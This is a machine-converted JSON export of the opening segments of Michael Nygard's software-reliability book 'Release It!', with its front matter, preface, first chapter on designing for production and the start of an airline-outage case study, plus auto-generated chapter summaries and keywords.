{
  "metadata": {
    "title": "Release It!",
    "author": "Michael T. Nygard",
    "publisher": "Unknown Publisher",
    "edition": "1st Edition",
    "isbn": "",
    "total_pages": 366,
    "conversion_date": "2025-11-28T12:58:12.528616",
    "conversion_method": "PyMuPDF + OCR fallback",
    "source_pdf": "Release It! Design and Deploy Production-Ready Software.pdf",
    "extraction_method": "Unstructured"
  },
  "chapters": [
    {
      "number": 1,
      "title": "Segment 1 (pages 3-10)",
      "start_page": 3,
      "end_page": 10,
      "detection_method": "topic_boundary",
      "content": "Release It! Second Edition Design and Deploy Production-Ready Software\n\nMichael T. Nygard\n\nThe Pragmatic Bookshelf Raleigh, North Carolina\n\nMany of the designations used by manufacturers and sellers to distinguish their products are claimed as trademarks. Where those designations appear in this book, and The Pragmatic Programmers, LLC was aware of a trademark claim, the designations have been printed in initial capital letters or in all capitals. The Pragmatic Starter Kit, The Pragmatic Programmer, Pragmatic Programming, Pragmatic Bookshelf, PragProg and the linking g device are trade- marks of The Pragmatic Programmers, LLC.\n\nEvery precaution was taken in the preparation of this book. However, the publisher assumes no responsibility for errors or omissions, or for damages that may result from the use of information (including program listings) contained herein.\n\nOur Pragmatic books, screencasts, and audio books can help you and your team create better software and have more fun. Visit us at https://pragprog.com.\n\nThe team that produced this book includes:\n\nPublisher: Andy Hunt VP of Operations: Janet Furlow Managing Editor: Brian MacDonald Supervising Editor: Jacquelyn Carter Development Editor: Katharine Dvorak Copy Editor: Molly McBeath Indexing: Potomac Indexing, LLC Layout: Gilson Graphics\n\nFor sales, volume licensing, and support, please contact support@pragprog.com.\n\nFor international rights, please contact rights@pragprog.com.\n\nCopyright © 2018 The Pragmatic Programmers, LLC. All rights reserved.\n\nNo part of this publication may be reproduced, stored in a retrieval system, or transmitted, in any form, or by any means, electronic, mechanical, photocopying, recording, or otherwise, without the prior consent of the publisher.\n\nPrinted in the United States of America. ISBN-13: 978-1-68050-239-8 Encoded using the finest acid-free high-entropy binary digits. Book version: P1.0—January 2018\n\n1.\n\n2.\n\n3.\n\nAcknowledgments\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPreface .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nLiving in Production . . Aiming for the Right Target The Scope of the Challenge A Million Dollars Here, a Million Dollars There Use the Force Pragmatic Architecture Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPart I — Create Stability\n\nCase Study: The Exception That Grounded an Airline . The Change Window The Outage Consequences Postmortem Hunting for Clues The Smoking Gun An Ounce of Prevention?\n\nStabilize Your System . Defining Stability Extending Your Life Span Failure Modes Stopping Crack Propagation Chain of Failure Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents\n\n.\n\n.\n\n.\n\nxi\n\n.\n\n.\n\n.\n\nxiii\n\n.\n\n.\n\n.\n\n1 2 3 3 4 5 6\n\n.\n\n.\n\n9 10 12 14 14 16 18 20\n\n.\n\n.\n\n.\n\n23 24 25 26 27 28 30\n\n4.\n\n5.\n\n6.\n\nStability Antipatterns Integration Points Chain Reactions Cascading Failures Users Blocked Threads Self-Denial Attacks Scaling Effects Unbalanced Capacities Dogpile Force Multiplier Slow Responses Unbounded Result Sets Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\nStability Patterns Timeouts Circuit Breaker Bulkheads Steady State Fail Fast Let It Crash Handshaking Test Harnesses Decoupling Middleware Shed Load Create Back Pressure Governor Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nPart II — Design for Production\n\nCase Study: Phenomenal Cosmic Powers, . Itty-Bitty Living Space .\n\n.\n\n.\n\nBaby’s First Christmas Taking the Pulse Thanksgiving Day Black Friday Vital Signs Diagnostic Tests\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • vi\n\n.\n\n31 33 46 49 51 62 69 71 75 78 80 84 86 90\n\n.\n\n91 91 95 98 101 106 108 111 113 117 119 120 123 125\n\n.\n\n129 130 131 132 132 134 135\n\nCall In a Specialist Compare Treatment Options Does the Condition Respond to Treatment? Winding Down\n\n7.\n\nFoundations . Networking in the Data Center and the Cloud Physical Hosts, Virtual Machines, and Containers Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n8.\n\nProcesses on Machines . Code Configuration Transparency Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n9.\n\nInterconnect Solutions at Different Scales DNS Load Balancing Demand Control Network Routing Discovering Services Migratory Virtual IP Addresses Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n10. Control Plane .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nHow Much Is Right for You? Mechanical Advantage Platform and Ecosystem Development Is Production System-Wide Transparency Configuration Services Provisioning and Deployment Services Command and Control The Platform Players The Shopping List Wrapping Up\n\n11. Security\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nThe OWASP Top 10 The Principle of Least Privilege\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • vii\n\n136 137 138 139\n\n.\n\n141 142 146 153\n\n.\n\n155 157 160 162 170\n\n.\n\n171 172 173 177 182 186 188 189 191\n\n.\n\n193 193 194 197 199 200 206 207 209 212 213 213\n\n.\n\n215 216 231\n\nConfigured Passwords Security as an Ongoing Process Wrapping Up\n\nPart III — Deliver Your System\n\n12. Case Study: Waiting for Godot .\n\n.\n\n.\n\n.\n\n.\n\n13. Design for Deployment . So Many Machines The Fallacy of Planned Downtime Automated Deployments Continuous Deployment Phases of Deployment Deploy Like the Pros Wrapping Up\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n14. Handling Versions . .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nHelp Others Handle Your Versions Handle Others’ Versions Wrapping Up\n\nPart IV — Solve Systemic Problems\n\n15. Case Study: Trampled by Your Own Customers . .\n\nCountdown and Launch Aiming for Quality Assurance Load Testing Murder by the Masses The Testing Gap Aftermath\n\n16. Adaptation .\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nConvex Returns Process and Organization System Architecture Information Architecture Wrapping Up\n\n17. Chaos Engineering . .\n\n17. Chaos Engineering . .\n\n. Breaking Things to Make Them Better\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • viii\n\n232 233 233\n\n.\n\n237\n\n.\n\n241 241 242 242 246 248 261 261\n\n.\n\n263 263 270 273\n\n.\n\n277 277 278 281 284 285 286\n\n.\n\n289 289 290 301 313 324\n\n.\n\n325 325\n\nAntecedents of Chaos Engineering The Simian Army Adopting Your Own Monkey Disaster Simulations Wrapping Up\n\nBibliography\n\n.\n\n.\n\n.\n\n.\n\nIndex\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\n.\n\nContents • ix\n\n326 328 329 335 336\n\n.\n\n337\n\n.\n\n339\n\nAcknowledgments\n\nI’d like to say a big thank you to the many people who have read and shared the first edition of Release It! I’m deeply happy that so many people have found it useful.\n\nOver the years, quite a few people have nudged me about updating this book. Thank you to Dion Stewart, Dave Thomas, Aino Corry, Kyle Larsen, John Allspaw, Stuart Halloway, Joanna Halloway, Justin Gehtland, Rich Hickey, Carin Meier, John Willis, Randy Shoup, Adrian Cockroft, Gene Kim, Dan North, Stefan Tilkov, and everyone else who saw that a few things had changed since we were building monoliths in 2006.\n\nThank you to all my technical reviewers: Adrian Cockcroft, Rod Hilton, Michael Hunger, Colin Jones, Andy Keffalas, Chris Nixon, Antonio Gomes Rodrigues, Stefan Turalski, Joshua White, Matthew White, Stephen Wolff, and Peter Wood. Your efforts and feedback have helped make this book much better.\n\nThanks also to Nora Jones and Craig Andera for letting me include your stories in these pages. The war stories have always been one of my favorite parts of the book, and I know many readers feel the same way.\n\nFinally, a huge thank you to Andy Hunt, Katharine Dvorak, Susannah Davidson Pfalzer, and the whole team at The Pragmatic Bookshelf. I appreciate your patience and perseverance.\n\nreport erratum • discuss",
      "page_number": 3,
      "chapter_number": 1,
      "summary": "This chapter covers segment 1 (pages 3-10). Key topics include software, wrapping, and engineering.",
      "keywords": [
        "Pragmatic Programmers",
        "Pragmatic Architecture Wrapping",
        "Wrapping",
        "Pragmatic",
        "software",
        "Pragmatic Bookshelf",
        "book",
        "Developer Relations Engineering",
        "chaos engineering",
        "Force Pragmatic Architecture",
        "engineering",
        "Early praise",
        "Wood Software Programmer",
        "Architecture Wrapping",
        "Case Study"
      ],
      "concepts": [
        "software",
        "wrapping",
        "engineering",
        "engineer",
        "stability",
        "stabilize",
        "book",
        "deployment",
        "deployments",
        "editor"
      ],
      "similar_chapters": [
        {
          "book": "AntiPatterns",
          "chapter": 9,
          "title": "Segment 9 (pages 74-81)",
          "relevance_score": 0.69,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 17,
          "title": "Segment 17 (pages 144-151)",
          "relevance_score": 0.67,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 1,
          "title": "Segment 1 (pages 2-12)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "A Philosophy of Software Design",
          "chapter": 2,
          "title": "Segment 2 (pages 10-17)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 1,
          "title": "Segment 1 (pages 1-8)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 2,
      "title": "Segment 2 (pages 11-18)",
      "start_page": 11,
      "end_page": 18,
      "detection_method": "topic_boundary",
      "content": "Preface\n\nIn this book, you will examine ways to architect, design, and build software —particularly distributed systems—for the muck and mire of the real world. You will prepare for the armies of illogical users who do crazy, unpredictable things. Your software will be under attack from the moment you release it. It needs to stand up to the typhoon winds of flash mobs or the crushing pressure of a DDoS attack by poorly secured IoT toaster ovens. You’ll take a hard look at software that failed the test and find ways to make sure your software survives contact with the real world.\n\nWho Should Read This Book\n\nI’ve targeted this book to architects, designers, and developers of distributed software systems, including websites, web services, and EAI projects, among others. These must be available or the company loses money. Maybe they’re commerce systems that generate revenue directly through sales or critical internal systems that employees use to do their jobs. If anybody has to go home for the day because your software stops working, then this book is for you.\n\nHow This Book Is Organized\n\nThe book is divided into four parts, each introduced by a case study. Part I: Create Stability shows you how to keep your systems alive, maintaining system uptime. Despite promises of reliability through redundancy, distributed systems exhibit availability more like “two eights” rather than the coveted “five nines.” Stability is a necessary prerequisite to any other concerns. If your system falls over and dies every day, nobody cares about anything else. Short-term fixes— and short-term thinking—will dominate in that environment. There’s no viable future without stability, so we’ll start by looking at ways to make a stable base.\n\nAfter stability, the next concern is ongoing operations. In Part II: Design for Production, you’ll see what it means to live in production. You’ll deal with the complexity of modern production environments in all their virtualized, con- tainerized, load-balanced, service-discovered gory detail. This part illustrates\n\nreport erratum • discuss\n\nPreface • xiv\n\ngood patterns for control, transparency, and availability in physical data centers and cloud environments.\n\nIn Part III: Deliver Your System, you’ll look at deployments. There are great tools for pouring bits onto servers now, but that turns out to be the easy part of the problem. It’s much harder to push frequent, small changes without breaking consumers. We’ll look at design for deployment and at deployments without downtime, and then we’ll move into versioning across disparate ser- vices—always a tricky issue!\n\nIn Part IV: Solve Systemic Problems, you’ll examine the system’s ongoing life as part of the overall information ecosystem. If release 1.0 is the birth of the system, then you need to think about its growth and development after that. In this part, you’ll see how to build systems that can grow, flex, and adapt over time. This includes evolutionary architecture and shared “knowledge” across systems. Finally, you’ll learn how to build antifragile systems through the emerging discipline of “chaos engineering” that uses randomness and deliberate stress on a system to improve it.\n\nAbout the Case Studies\n\nI included several extended case studies to illustrate the major themes of this book. These case studies are taken from real events and real system failures that I have personally observed. These failures were very costly and embar- rassing for those involved. Therefore, I obfuscated some information to protect the identities of the companies and people involved. I also changed the names of the systems, classes, and methods. Only such nonessential details have been changed, however. In each case, I maintained the same industry, sequence of events, failure mode, error propagation, and outcome. The costs of these failures are not exaggerated. These are real companies, and this is real money. I preserved those figures to underscore the seriousness of this material. Real money is on the line when systems fail.\n\nOnline Resources\n\nThis book has its own web page,1 where you can find details about it, download the source code, post to the discussion forums, and report errata such as typos and content suggestions. The discussion forums are the perfect place to talk shop with other readers and share your comments about the book.\n\nNow, let’s get started with an introduction to living in production.\n\n1.\n\nhttps://pragprog.com/titles/mnee2/46\n\nreport erratum • discuss\n\nCHAPTER 1\n\nLiving in Production\n\nYou’ve worked hard on your project. It looks like all the features are actu- ally complete, and most even have tests. You can breathe a sigh of relief. You’re done.\n\nOr are you?\n\nDoes “feature complete” mean “production ready”? Is your system really ready to be deployed? Can it be run by operations and face the hordes of real-world users without you? Are you starting to get that sinking feeling that you’ll be faced with late-night emergency phone calls and alerts? It turns out there’s a lot more to development than just adding all the features.\n\nSoftware design as taught today is terribly incomplete. It only talks about what systems should do. It doesn’t address the converse—what systems should not do. They should not crash, hang, lose data, violate privacy, lose money, destroy your company, or kill your customers.\n\nToo often, project teams aim to pass the quality assurance (QA) department’s tests instead of aiming for life in production. That is, the bulk of your work probably focuses on passing testing. But testing—even agile, pragmatic, automated testing—is not enough to prove that software is ready for the real world. The stresses and strains of the real world, with crazy real users, globe- spanning traffic, and virus-writing mobs from countries you’ve never even heard of go well beyond what you could ever hope to test for.\n\nBut first, you will need to accept the fact that despite your best laid plans, bad things will still happen. It’s always good to prevent them when possible, of course. But it can be downright fatal to assume that you’ve predicted and eliminated all possible bad events. Instead, you want to take action and pre- vent the ones you can but make sure that your system as a whole can recover from whatever unanticipated, severe traumas might befall it.\n\nreport erratum • discuss\n\nChapter 1. Living in Production • 2\n\nAiming for the Right Target\n\nMost software is designed for the development lab or the testers in the QA department. It is designed and built to pass tests such as, “The customer’s first and last names are required, but the middle initial is optional.” It aims to survive the artificial realm of QA, not the real world of production.\n\nSoftware design today resembles automobile design in the early ’90s—discon- nected from the real world. Cars designed solely in the cool comfort of the lab looked great in models and CAD systems. Perfectly curved cars gleamed in front of giant fans, purring in laminar flow. The designers inhabiting these serene spaces produced designs that were elegant, sophisticated, clever, fragile, unsatisfying, and ultimately short-lived. Most software architecture and design happens in equally clean, distant environs.\n\nDo you want a car that looks beautiful but spends more time in the shop than on the road? Of course not! You want to own a car designed for the real world. You want a car designed by somebody who knows that oil changes are always 3,000 miles late, that the tires must work just as well on the last sixteenth of an inch of tread as on the first, and that you will certainly, at some point, stomp on the brakes while holding an Egg McMuffin in one hand and a phone in the other.\n\nWhen our system passes QA, can we say with confidence that it’s ready for production? Simply passing QA tells us little about the system’s suitability for the next three to ten years of life. It could be the Toyota Camry of software, racking up thousands of hours of continuous uptime. Or it could be the Chevy Vega (a car whose front end broke off on the company’s own test track) or the Ford Pinto (a car prone to blowing up when hit in just the right way). It’s impossible to tell from a few days or even a few weeks of testing what the next several years will bring.\n\nProduct designers in manufacturing have long pursued “design for manufac- turability”—the engineering approach of designing products such that they can be manufactured at low cost and high quality. Prior to this era, product designers and fabricators lived in different worlds. Designs thrown over the wall to production included screws that could not be reached, parts that were easily confused, and custom parts where off-the-shelf components would serve. Inevitably, low quality and high manufacturing cost followed.\n\nWe’re in a similar state today. We end up falling behind on the new system because we’re constantly taking support calls from the last half-baked project we shoved out the door. Our analog of “design for manufacturability” is “design\n\nreport erratum • discuss\n\nThe Scope of the Challenge • 3\n\nfor production.” We don’t hand designs to fabricators, but we do hand finished software to IT operations. We need to design individual software systems, and the whole ecosystem of interdependent systems, to operate at low cost and high quality.\n\nThe Scope of the Challenge\n\nIn the easy, laid-back days of client/server systems, a system’s user base would be measured in the tens or hundreds, with a few dozen concurrent users at most. Today we routinely see active user counts larger than the population of entire continents. And I’m not just talking about Antarctica and Australia here! We’ve seen our first billion-user social network, and it won’t be the last.\n\nUptime demands have increased too. Whereas the famous “five nines” (99.999 percent) uptime was once the province of the mainframe and its caretakers, even garden-variety commerce sites are now expected to be available 24 by 7 by 365. (That phrase has always bothered me. As an engineer, I expect it to either be “24 by 365” or be “24 by 7 by 52.”) Clearly, we’ve made tremendous strides even to consider the scale of software built today; but with the increased reach and scale of our systems come new ways to break, more hostile environments, and less tolerance for defects.\n\nThe increasing scope of this challenge—to build software fast that’s cheap to build, good for users, and cheap to operate—demands continually improving architecture and design techniques. Designs appropriate for small WordPress websites fail outrageously when applied to large scale, transactional, distribut- ed systems, and we’ll look at some of those outrageous failures.\n\nA Million Dollars Here, a Million Dollars There\n\nA lot is on the line here: your project’s success, your stock options or profit sharing, your company’s survival, and even your job. Systems built for QA often require so much ongoing expense, in the form of operations cost, downtime, and software maintenance, that they never reach profitability, let alone net positive cash for the business (reached only after the profits gener- ated by the system pay back the costs incurred in building it.) These systems exhibit low availability, direct losses in missed revenue, and indirect losses through damage to the brand.\n\nDuring the hectic rush of a development project, you can easily make decisions that optimize development cost at the expense of operational cost. This makes sense only in the context of the team aiming for a fixed budget and delivery\n\nreport erratum • discuss\n\nChapter 1. Living in Production • 4\n\ndate. In the context of the organization paying for the software, it’s a bad choice. Systems spend much more of their life in operation than in develop- ment—at least, the ones that don’t get canceled or scrapped do. Avoiding a one-time developmental cost and instead incurring a recurring operational cost makes no sense. In fact, the opposite decision makes much more financial sense. Imagine that your system requires five minutes of downtime on every release. You expect your system to have a five-year life span with monthly releases. (Most companies would like to do more releases per year, but I’m being very conservative.) You can compute the expected cost of downtime, dis- counted by the time-value of money. It’s probably on the order of $1,000,000 (300 minutes of downtime at a very modest cost of $3,000 per minute).\n\nNow suppose you could invest $50,000 to create a build pipeline and deployment process that avoids downtime during releases. That will, at a minimum, avoid the million-dollar loss. It’s very likely that it will also allow you to increase deployment frequency and capture market share. But let’s stick with the direct gain for now. Most CFOs would not mind authorizing an expenditure that returns 2,000 percent ROI!\n\nDesign and architecture decisions are also financial decisions. These choices must be made with an eye toward their implementation cost as well as their downstream costs. The fusion of technical and financial viewpoints is one of the most important recurring themes in this book.\n\nUse the Force\n\nYour early decisions make the biggest impact on the eventual shape of your system. The earliest decisions you make can be the hardest ones to reverse later. These early decisions about the system boundary and decomposition into subsystems get crystallized into the team structure, funding allocation, program management structure, and even time-sheet codes. Team assignments are the first draft of the architecture. It’s a terrible irony that these very early decisions are also the least informed. The beginning is when your team is most ignorant of the eventual structure of the software, yet that’s when some of the most irrevocable decisions must be made.\n\nI’ll reveal myself here and now as a proponent of agile development. The emphasis on early delivery and incremental improvements means software gets into production quickly. Since production is the only place to learn how the software will respond to real-world stimuli, I advocate any approach that begins the learning process as soon as possible. Even on agile projects, deci- sions are best made with foresight. It seems as if the designer must “use the force” to see the future in order to select the most robust design. Because\n\nreport erratum • discuss\n\nPragmatic Architecture • 5\n\ndifferent alternatives often have similar implementation costs but radically different life-cycle costs, it is important to consider the effects of each decision on availability, capacity, and flexibility. I’ll show you the downstream effects of dozens of design alternatives, with concrete examples of beneficial and harmful approaches. These examples all come from real systems I’ve worked on. Most of them cost me sleep at one time or another.\n\nPragmatic Architecture\n\nTwo divergent sets of activities both fall under the term architecture. One type of architecture strives toward higher levels of abstraction that are more portable across platforms and less connected to the messy details of hardware, networks, electrons, and photons. The extreme form of this approach results in the “ivory tower”—a Kubrick-esque clean room inhabited by aloof gurus and decorated with boxes and arrows on every wall. Decrees emerge from the ivory tower and descend upon the toiling coders. “The middleware shall be JBoss, now and forever!” “All UIs shall be constructed with Angular 1.0!” “All that is, all that was, and all that shall ever be lives in Oracle!” “Thou shalt not engage in Ruby!” If you’ve ever gritted your teeth while coding something according to the “com- pany standards” that would be ten times easier with some other technology, then you’ve been the victim of an ivory-tower architect. I guarantee that an architect who doesn’t bother to listen to the coders on the team doesn’t bother listening to the users either. You’ve seen the result: users who cheer when the system crashes because at least then they can stop using it for a while.\n\nIn contrast, another breed of architect doesn’t just rub shoulders with the coders but is one. This kind of architect does not hesitate to peel back the lid on an abstraction or to jettison one if it doesn’t fit. This pragmatic architect is more likely to discuss issues such as memory usage, CPU requirements, bandwidth needs, and the benefits and drawbacks of hyperthreading and CPU binding.\n\nThe ivory-tower architect most enjoys an end-state vision of ringing crystal perfection, but the pragmatic architect constantly thinks about the dynamics of change. “How can we do a deployment without rebooting the world?” “What metrics do we need to collect, and how will we analyze them?” “What part of the system needs improvement the most?” When the ivory-tower architect is done, the system will not admit any improvements; each part will be perfectly adapted to its role. Contrast that to the pragmatic architect’s creation, in which each component is good enough for the current stresses—and the architect knows which ones need to be replaced depending on how the stress factors change over time.\n\nreport erratum • discuss\n\nChapter 1. Living in Production • 6\n\nIf you’re already a pragmatic architect, then I’ve got chapters full of powerful ammunition for you. If you’re an ivory-tower architect—and you haven’t already stopped reading—then this book might entice you to descend through a few levels of abstraction to get back in touch with that vital intersection of soft- ware, hardware, and users: living in production. You, your users, and your company will be much happier when the time comes to finally release it!\n\nWrapping Up\n\nSoftware delivers its value in production. The development project, testing, integration, and planning...everything before production is prelude. This book deals with life in production, from the initial release through ongoing growth and evolution of the system. The first part of this book deals with stability. To get a better sense of the kind of issues involved in keeping your software from crashing, let’s start by looking at the software bug that grounded an airline.\n\nreport erratum • discuss",
      "page_number": 11,
      "chapter_number": 2,
      "summary": "This chapter covers segment 2 (pages 11-18). Key topics include systems, systemic, and design.",
      "keywords": [
        "Simian Army Adopting",
        "Monkey Disaster Simulations",
        "Disaster Simulations Wrapping",
        "Wrapping Up Bibliography",
        "Simian Army",
        "Army Adopting",
        "Monkey Disaster",
        "Disaster Simulations",
        "Simulations Wrapping",
        "systems",
        "software",
        "Production",
        "book",
        "design",
        "’ll"
      ],
      "concepts": [
        "systems",
        "systemic",
        "design",
        "production",
        "product",
        "costly",
        "users",
        "report",
        "decisions",
        "decision"
      ],
      "similar_chapters": [
        {
          "book": "Reliable Machine Learning",
          "chapter": 36,
          "title": "Segment 36 (pages 309-316)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 45,
          "title": "Segment 45 (pages 456-462)",
          "relevance_score": 0.55,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 4,
          "title": "Segment 4 (pages 26-50)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "Reliable Machine Learning",
          "chapter": 20,
          "title": "Segment 20 (pages 170-177)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 16,
          "title": "Segment 16 (pages 135-143)",
          "relevance_score": 0.5,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 3,
      "title": "Segment 3 (pages 19-26)",
      "start_page": 19,
      "end_page": 26,
      "detection_method": "topic_boundary",
      "content": "Part I\n\nCreate Stability\n\nCHAPTER 2\n\nCase Study: The Exception That Grounded an Airline\n\nHave you ever noticed that the incidents that blow up into the biggest issues start with something very small? A tiny programming error starts the snowball rolling downhill. As it gains momentum, the scale of the problem keeps getting bigger and bigger. A major airline experienced just such an incident. It even- tually stranded thousands of passengers and cost the company hundreds of thousands of dollars. Here’s how it happened.\n\nAs always, all names, places, and dates have been changed to protect the confidentiality of the people and companies involved.\n\nIt started with a planned failover on the database cluster that served the core facilities (CF). The airline was moving toward a service-oriented architecture, with the usual goals of increasing reuse, decreasing development time, and decreasing operational costs. At this time, CF was in its first generation. The CF team planned a phased rollout, driven by features. It was a sound plan, and it probably sounds familiar—most large companies have some variation of this project underway now.\n\nCF handled flight searches—a common service for any airline application. Given a date, time, city, airport code, flight number, or any combination thereof, CF could find and return a list of flight details. When this incident happened, the self-service check-in kiosks, phone menus, and “channel partner” applications had been updated to use CF. Channel partner applica- tions generate data feeds for big travel-booking sites. IVR and self-service check-in are both used to put passengers on airplanes—“butts in seats,” in the vernacular. The development schedule had plans for new releases of the gate agent and call center applications to transition to CF for flight lookup,\n\nreport erratum • discuss\n\nChapter 2. Case Study: The Exception That Grounded an Airline • 10\n\nbut those had not been rolled out yet. This turned out to be a good thing, as you’ll soon see.\n\nThe architects of CF were well aware of how critical it would be to the business. They built it for high availability. It ran on a cluster of J2EE application servers with a redundant Oracle 9i database. All the data were stored on a large external RAID array with twice-daily, off-site backups on tape and on- disk replicas in a second chassis that were guaranteed to be five minutes old at most. Everything was on real hardware, no virtualization. Just melted sand, spinning rust, and the operating systems.\n\nThe Oracle database server ran on one node of the cluster at a time, with Veritas Cluster Server controlling the database server, assigning the virtual IP address, and mounting or unmounting filesystems from the RAID array. Up front, a pair of redundant hardware load balancers directed incoming traffic to one of the application servers. Client applications like the server for check-in kiosks and the IVR system would connect to the front-end virtual IP address. So far, so good.\n\nThe diagram on page 11 probably looks familiar. It’s a common high-availability architecture for physical infrastructure, and it’s a good one. CF did not suffer from any of the usual single-point-of-failure problems. Every piece of hardware was redundant: CPUs, drives, network cards, power supplies, network switches, even down to the fans. The servers were even split into different racks in case a single rack got damaged or destroyed. In fact, a second location thirty miles away was ready to take over in the event of a fire, flood, bomb, or attack by Godzilla.\n\nThe Change Window\n\nAs was the case with most of my large clients, a local team of engineers dedi- cated to the account operated the airline’s infrastructure. In fact, that team had been doing most of the work for more than three years when this hap- pened. On the night the problem started, the local engineers had executed a manual database failover from CF database 1 to CF database 2 (see diagram). They used Veritas to migrate the active database from one host to the other. This allowed them to do some routine maintenance to the first host. Totally routine. They had done this procedure dozens of times in the past.\n\nI will say that this was back in the day when “planned downtime” was a normal thing. That’s not the way to operate now.\n\nVeritas Cluster Server was orchestrating the failover. In the space of one minute, it could shut down the Oracle server on database 1, unmount the\n\nreport erratum • discuss\n\nThe Change Window • 11\n\nCF Database 1\n\nVirtual IP Address\n\nSCSI\n\nSCSIHardware Load Balancer\n\nVirtual IP Address\n\nHeartbeat\n\nRAID 5Array\n\nCF Database 2\n\nCF App n\n\nCF App 3\n\nCF App 2\n\nCF App 1\n\nfilesystems from the RAID array, remount them on database 2, start Oracle there, and reassign the virtual IP address to database 2. The application servers couldn’t even tell that anything had changed, because they were configured to connect to the virtual IP address only.\n\nThe client scheduled this particular change for a Thursday evening around 11 p.m. Pacific time. One of the engineers from the local team worked with the operations center to execute the change. All went exactly as planned. They migrated the active database from database 1 to database 2 and then updated database 1. After double-checking that database 1 was updated correctly, they migrated the database back to database 1 and applied the same change to database 2. The whole time, routine site monitoring showed that the applications were continuously available. No downtime was planned for this change, and none occurred. At about 12:30 a.m., the crew marked the change as “Completed, Success” and signed off. The local engineer headed for bed, after working a 22-hour shift. There’s only so long you can run on double espressos, after all.\n\nNothing unusual occurred until two hours later.\n\nreport erratum • discuss\n\nChapter 2. Case Study: The Exception That Grounded an Airline • 12\n\nThe Outage\n\nAt about 2:30 a.m., all the check-in kiosks went red on the monitoring console. Every single one, everywhere in the country, stopped servicing requests at the same time. A few minutes later, the IVR servers went red too. Not exactly panic time, but pretty close, because 2:30 a.m. Pacific time is 5:30 a.m. Eastern time, which is prime time for commuter flight check-in on the Eastern seaboard. The operations center immediately opened a Severity 1 case and got the local team on a conference call.\n\nIn any incident, my first priority is always to restore service. Restoring service takes precedence over investigation. If I can collect some data for postmortem analysis, that’s great—unless it makes the outage longer. When the fur flies, improvisation is not your friend. Fortunately, the team had created scripts long ago to take thread dumps of all the Java applications and snapshots of the databases. This style of automated data collection is the perfect balance. It’s not improvised, it does not prolong an outage, yet it aids postmortem analysis. According to procedure, the operations center ran those scripts right away. They also tried restarting one of the kiosks’ application servers.\n\nThe trick to restoring service is figuring out what to target. You can always “reboot the world” by restarting every single server, layer by layer. That’s almost always effective, but it takes a long time. Most of the time, you can find one culprit that is really locking things up. In a way, it’s like a doctor diagnosing a disease. You could treat a patient for every known disease, but that will be painful, expensive, and slow. Instead, you want to look at the symptoms the patient shows to figure out exactly which disease to treat. The trouble is that individual symptoms aren’t specific enough. Sure, once in a while some symptom points you directly at the fundamental problem, but not usually. Most of the time, you get symptoms—like a fever—that tell you nothing by themselves.\n\nHundreds of diseases can cause fevers. To distinguish between possible causes, you need more information from tests or observations.\n\nIn this case, the team was facing two separate sets of applications that were both completely hung. It happened at almost the same time, close enough that the difference could just be latency in the separate monitoring tools that the kiosks and IVR applications used. The most obvious hypothesis was that both sets of applications depended on some third entity that was in trouble. As you can see from the dependency diagram on page 13, that was a big finger pointing at CF, the only common dependency shared by the kiosks and the IVR system. The fact that CF had a database failover three hours before this\n\nreport erratum • discuss\n\nThe Outage • 13\n\nIVRBlade\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nCheck-inKiosk\n\nIVRBlade\n\nIVRBlade\n\nIVRAppCluster\n\nSabre\n\nTravelSites\n\nCCVS\n\nKioskWestCluster\n\nKioskEastCluster\n\nCF\n\nproblem also made it highly suspect. Monitoring hadn’t reported any trouble with CF, though. Log file scraping didn’t reveal any problems, and neither did URL probing. As it turns out, the monitoring application was only hitting a status page, so it did not really say much about the real health of the CF appli- cation servers. We made a note to fix that error through normal channels later.\n\nRemember, restoring service was the first priority. This outage was approaching the one-hour SLA limit, so the team decided to restart each of the CF applica- tion servers. As soon as they restarted the first CF application server, the IVR systems began recovering. Once all CF servers were restarted, IVR was green but the kiosks still showed red. On a hunch, the lead engineer decided to restart the kiosks’ own application servers. That did the trick; the kiosks and IVR systems were all showing green on the board.\n\nThe total elapsed time for the incident was a little more than three hours.\n\nreport erratum • discuss\n\nChapter 2. Case Study: The Exception 